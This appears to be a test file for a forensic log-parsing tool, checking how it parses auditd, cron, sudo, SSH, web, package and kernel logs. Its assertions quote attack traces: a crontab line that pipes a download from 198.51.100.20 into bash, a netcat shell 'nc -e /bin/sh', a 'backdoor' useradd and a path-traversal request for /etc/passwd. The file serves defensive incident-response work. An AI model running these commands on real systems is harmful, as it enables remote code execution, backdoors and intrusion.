"""Phase 3 parsers: auditd, cron, sudo, SSH files, web, package managers, kernel."""

from __future__ import annotations

import base64
import hashlib
import sqlite3
from datetime import UTC, datetime
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest

from sherlog.core.config import Settings
from sherlog.core.db import make_engine
from sherlog.identify.sample import read_sample
from sherlog.identify.service import identify_sample
from sherlog.parsers.auditd import AuditdParser, parse_fields
from sherlog.parsers.base import ParseContext, ParsedEvent, Parser
from sherlog.parsers.cron_files import CrontabParser
from sherlog.parsers.kernel import DmesgParser
from sherlog.parsers.packages import (
    AptHistoryParser,
    DnfRpmLogParser,
    DpkgLogParser,
    YumLogParser,
)
from sherlog.parsers.ssh_files import AuthorizedKeysParser, SshdConfigParser, fingerprint
from sherlog.parsers.sudo_log import SudoLogParser
from sherlog.parsers.syslog import CronLogParser, KernelLogParser
from sherlog.parsers.web import ApacheErrorParser, NginxErrorParser, WebAccessParser
from tests.helpers import FIXTURES, copy_fixture

KEY_BLOB = "AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"
KEY_FP = "SHA256:" + base64.b64encode(
    hashlib.sha256(base64.b64decode(KEY_BLOB)).digest()
).decode().rstrip("=")


def _parse(
    parser: Parser, path: Path, tz: str = "UTC", mtime: datetime | None = None
) -> list[ParsedEvent]:
    return list(parser.parse(path, ParseContext(path=path, case_tz=ZoneInfo(tz), mtime=mtime)))


def _types(events: list[ParsedEvent]) -> list[str]:
    return [e.event_type for e in events]


# --- identification -------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("fixture", "expected"),
    [
        ("audit.log", "linux.audit"),
        ("sudo.log", "sudo.log"),
        ("crontab_user", "cron.crontab"),
        ("crontab_system", "cron.crontab"),
        ("authorized_keys", "ssh.authorized_keys"),
        ("known_hosts", "unclassified"),
        ("sshd_config", "ssh.sshd_config"),
        ("access.log", "web.access"),
        ("apache_error.log", "web.apache_error"),
        ("nginx_error.log", "web.nginx_error"),
        ("dpkg.log", "pkg.dpkg"),
        ("apt_history.log", "pkg.apt_history"),
        ("yum.log", "pkg.yum"),
        ("dnf.rpm.log", "pkg.dnf_rpm"),
        ("kern.log", "linux.kernel"),
        ("dmesg.txt", "linux.dmesg"),
        ("dmesg_T.txt", "linux.dmesg"),
        ("cron", "linux.cron"),
        # Phase 2 fixtures must keep their identification.
        ("auth.log", "linux.auth"),
        ("syslog", "linux.syslog"),
        ("journal.json", "journald.json"),
        ("bash_history", "shell.bash_history"),
    ],
)
def test_identification_by_content(tmp_path: Path, fixture: str, expected: str) -> None:
    path = copy_fixture(fixture, tmp_path / "evidence.bin")  # name carries no information
    ident = identify_sample(read_sample(path, path.stat().st_size))
    assert ident.artifact_type == expected, ident.candidates


# --- auditd ---------------------------------------------------------------------------------


def test_auditd() -> None:
    events = _parse(AuditdParser(), FIXTURES / "audit.log")
    assert _types(events) == [
        "service.start",
        "other",
        "auth.login.failure",
        "auth.login.success",
        "auth.sudo",
        "user.create",
        "other",
        "process.exec",
        "other",
        "service.stop",
        "service.stop",
        "other",
        "parse_error",
    ]
    start, auth, fail, ok, sudo, add, syscall, execve, proctitle, svc, end, cfg = events[:12]
    assert start.target == "auditd" and start.timestamp_utc == datetime(2024, 5, 1, 10, tzinfo=UTC)
    assert fail.actor == "root" and fail.src_ip == "203.0.113.50" and "res:failed" in fail.tags
    assert ok.actor == "uid:1001"
    assert sudo.command == "useradd bad" and sudo.actor == "uid:1001"
    assert add.target == "bad"
    assert syscall.command == "/usr/bin/nc.openbsd" and "key:exec_watch" in syscall.tags
    assert syscall.extra and syscall.extra["a0"] == "10"  # register value, not hex-decoded
    assert execve.command == "nc -e /bin/sh"
    assert proctitle.command == "nc -e /bin/sh"
    assert {e.extra["serial"] for e in (syscall, execve, proctitle) if e.extra} == {"42"}
    assert svc.target == "auditd"
    assert "audit_stopped" in end.tags
    assert "audit_disabled" in cfg.tags
    assert auth.actor == "root" and "res:failed" in auth.tags


def test_auditd_enriched_names() -> None:
    body = (
        "pid=1 uid=0 auid=1001 ses=2 msg='op=login id=1001 res=success'"
        '\x1dUID="root" AUID="alice"'
    )
    fields = parse_fields(body, "USER_LOGIN")
    assert fields["AUID"] == "alice" and fields["op"] == "login"


# --- cron / sudo ------------------------------------------------------------------------------


def test_cron_log() -> None:
    events = _parse(CronLogParser(), FIXTURES / "cron", mtime=datetime(2024, 5, 2, tzinfo=UTC))
    assert _types(events) == ["cron.exec", "cron.exec", "cron.exec", "cron.modify", "cron.exec"]
    assert events[0].command == "run-parts /etc/cron.hourly"
    assert events[1].command == "0anacron"
    assert events[2].target == "cron.daily"
    assert events[4].actor == "apache"


def test_user_crontab(tmp_path: Path) -> None:
    path = copy_fixture("crontab_user", tmp_path / "var/spool/cron/crontabs/www-data")
    events = _parse(CrontabParser(), path, mtime=datetime(2024, 5, 1, tzinfo=UTC))
    assert _types(events) == ["cron.entry", "cron.entry"]
    assert [e.actor for e in events] == ["www-data", "www-data"]
    assert events[1].command == "curl -s http://198.51.100.20/p | bash"
    assert "schedule:@reboot" in events[1].tags
    assert events[0].timestamp_utc is None
    assert events[0].extra and events[0].extra["file_mtime"].startswith("2024-05-01")


def test_system_crontab(tmp_path: Path) -> None:
    path = copy_fixture("crontab_system", tmp_path / "etc/crontab")
    events = _parse(CrontabParser(), path)
    assert [e.actor for e in events] == ["root", "root", "www-data"]
    assert events[2].command == "/var/www/html/uploads/.cache.sh"
    assert "system_crontab" in events[2].tags


def test_sudo_log_continuations_and_year() -> None:
    events = _parse(SudoLogParser(), FIXTURES / "sudo.log", mtime=datetime(2025, 1, 2, tzinfo=UTC))
    assert _types(events) == ["auth.sudo"] * 3
    assert events[0].timestamp_utc == datetime(2024, 12, 31, 23, 59, tzinfo=UTC)
    assert events[1].command == "/usr/sbin/useradd -m -s /bin/bash -G sudo backdoor"
    assert events[1].line_number == 3
    assert events[2].timestamp_utc == datetime(2025, 1, 1, 0, 3, tzinfo=UTC)
    assert "year_inferred" not in events[2].tags and "sudo_failed" in events[2].tags


# --- SSH --------------------------------------------------------------------------------------


def test_fingerprint_matches_openssh_algorithm() -> None:
    assert fingerprint(KEY_BLOB) == KEY_FP
    assert fingerprint("not base64!!") is None


def test_authorized_keys(tmp_path: Path) -> None:
    path = copy_fixture("authorized_keys", tmp_path / "home/deploy/.ssh/authorized_keys")
    events = _parse(AuthorizedKeysParser(), path)
    assert _types(events) == ["ssh.key.present", "ssh.key.present", "parse_error"]
    plain, restricted = events[0], events[1]
    assert plain.actor == "deploy" and plain.target == KEY_FP
    assert plain.extra and plain.extra["comment"] == "deploy@laptop"
    assert restricted.command == "/usr/local/bin/backup.sh"
    assert {"forced_command", "source_restricted"} <= set(restricted.tags)


def test_sshd_config() -> None:
    events = _parse(SshdConfigParser(), FIXTURES / "sshd_config")
    by_kw = {e.target: e for e in events}
    assert "risky:root_login" in by_kw["PermitRootLogin"].tags
    assert "risky:password_auth" in by_kw["PasswordAuthentication"].tags
    assert "risky:tunnel" in by_kw["PermitTunnel"].tags
    assert "match:User backup" in by_kw["PermitTunnel"].tags
    assert "risky:root_login" not in by_kw["UsePAM"].tags
    assert all(e.event_type == "config.entry" and e.timestamp_utc is None for e in events)


# --- web --------------------------------------------------------------------------------------


def test_access_log() -> None:
    events = _parse(WebAccessParser(), FIXTURES / "access.log")
    assert _types(events) == ["web.request"] * 6 + ["parse_error"]
    first, lfi, upload, shell, tls, scan = events[:6]
    assert first.timestamp_utc == datetime(2024, 5, 1, 7, 0, tzinfo=UTC)
    assert first.timezone_assumed is False and first.src_ip == "203.0.113.77"
    assert lfi.target == "/index.php?page=../../../../etc/passwd"
    assert lfi.extra and lfi.extra["user_agent"].startswith("sqlmap/")
    assert upload.extra and upload.extra["method"] == "POST" and upload.extra["bytes"] == 88
    assert shell.actor == "admin"
    assert shell.extra and shell.extra["x_forwarded_for"] == "198.51.100.9"
    assert "malformed_request" in tls.tags and tls.extra and tls.extra["status"] == 400
    assert scan.src_ip == "2001:db8::7" and scan.extra and scan.extra["bytes"] is None


def test_apache_error_log() -> None:
    events = _parse(ApacheErrorParser(), FIXTURES / "apache_error.log", tz="Africa/Addis_Ababa")
    assert _types(events) == ["web.error"] * 3
    assert events[0].src_ip == "203.0.113.77"
    assert events[0].timestamp_utc == datetime(2024, 5, 1, 7, 0, 5, 123456, tzinfo=UTC)
    assert "module:php" in events[0].tags and events[0].timezone_assumed
    assert events[2].src_ip is None and "level:notice" in events[2].tags


def test_nginx_error_log() -> None:
    events = _parse(NginxErrorParser(), FIXTURES / "nginx_error.log")
    assert events[0].src_ip == "203.0.113.77" and events[0].target == "/wp-login.php"
    assert events[0].host == "web01"
    assert events[2].src_ip is None


# --- package managers -------------------------------------------------------------------------


def test_dpkg_log() -> None:
    events = _parse(DpkgLogParser(), FIXTURES / "dpkg.log", tz="Africa/Addis_Ababa")
    typed = [(e.event_type, e.target) for e in events if e.event_type != "other"]
    assert typed == [
        ("package.install", "netcat-traditional:amd64"),
        ("package.upgrade", "openssh-server:amd64"),
        ("package.remove", "auditd:amd64"),
        ("package.remove", "auditd:amd64"),
    ]
    assert events[1].timestamp_utc == datetime(2024, 5, 1, 7, 20, 1, tzinfo=UTC)
    assert events[1].extra and events[1].extra["version"] == "1.10-47"
    assert events[5].target == "netcat-traditional:amd64"  # status line


def test_apt_history() -> None:
    events = _parse(AptHistoryParser(), FIXTURES / "apt_history.log")
    assert _types(events) == ["package.install", "package.remove"]
    assert events[0].actor == "deploy"
    assert events[0].command == "apt-get install -y netcat-traditional"
    assert events[1].extra and events[1].extra["packages"] == [
        "auditd:amd64",
        "libauparse0:amd64",
    ]
    assert events[0].timestamp_utc == datetime(2024, 5, 1, 10, 19, 58, tzinfo=UTC)


def test_yum_log_year_rollover() -> None:
    events = _parse(YumLogParser(), FIXTURES / "yum.log", mtime=datetime(2025, 1, 3, tzinfo=UTC))
    assert _types(events) == [
        "package.install",
        "package.upgrade",
        "package.install",
        "package.remove",
    ]
    assert events[0].timestamp_utc == datetime(2024, 12, 30, 9, tzinfo=UTC)
    assert events[3].timestamp_utc == datetime(2025, 1, 2, 8, 5, tzinfo=UTC)


def test_dnf_rpm_log() -> None:
    events = _parse(DnfRpmLogParser(), FIXTURES / "dnf.rpm.log")
    assert _types(events) == [
        "other",
        "package.install",
        "other",  # in-progress "Upgrade:" marker, not double counted
        "package.upgrade",
        "package.remove",
    ]
    assert events[1].timezone_assumed is False
    assert events[1].timestamp_utc == datetime(2024, 5, 1, 7, 0, 5, tzinfo=UTC)


# --- kernel -----------------------------------------------------------------------------------


def test_kern_log() -> None:
    events = _parse(
        KernelLogParser(), FIXTURES / "kern.log", mtime=datetime(2024, 5, 2, tzinfo=UTC)
    )
    assert events[0].event_type == "system.boot"
    fw = events[1]
    assert fw.src_ip == "203.0.113.77" and fw.dst_ip == "10.0.0.5"
    assert {"firewall", "dport:3306", "proto:TCP"} <= set(fw.tags)
    assert "crash" in events[2].tags
    assert "taint" in events[3].tags
    assert "promiscuous" in events[4].tags


def test_dmesg_uptime_and_human() -> None:
    plain = _parse(DmesgParser(), FIXTURES / "dmesg.txt")
    assert plain[0].event_type == "system.boot" and plain[0].timestamp_utc is None
    assert plain[0].extra == {"uptime_seconds": 0.0} and "uptime_only" in plain[0].tags
    assert "usb" in plain[1].tags and "taint" in plain[2].tags
    human = _parse(DmesgParser(), FIXTURES / "dmesg_T.txt", tz="Africa/Addis_Ababa")
    assert human[0].timestamp_utc == datetime(2024, 5, 1, 7, tzinfo=UTC)
    assert "promiscuous" in human[1].tags


# --- schema migration -------------------------------------------------------------------------


def test_old_case_db_gains_new_columns(settings: Settings, tmp_path: Path) -> None:
    db = tmp_path / "old.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE events (id INTEGER PRIMARY KEY, raw TEXT NOT NULL)")
    con.commit()
    con.close()
    make_engine(db).dispose()
    con = sqlite3.connect(db)
    cols = {row[1] for row in con.execute("PRAGMA table_info(events)")}
    con.close()
    assert "extra" in cols  # nullable column added in place
    assert "tags" not in cols  # non-nullable columns are never added implicitly
